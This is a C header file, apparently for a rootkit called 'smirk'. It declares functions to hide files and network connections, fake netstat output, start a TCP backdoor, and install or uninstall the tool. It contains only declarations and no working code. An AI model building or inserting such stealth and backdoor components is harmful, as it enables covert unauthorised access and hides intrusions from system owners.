#include "smirk.h"

int matches_reg(const char *, const char *);
int is_magicfile(const char *);
int is_net_file(const char *);
int fake_netstat(char *, char *);
void *backdoor(void *);
void start_tcp_backdoor();
void install();
#ifdef KILLSWITCH
void uninstall();
#endif
int read_line(int, char *, int);
int is_port_usable(int);
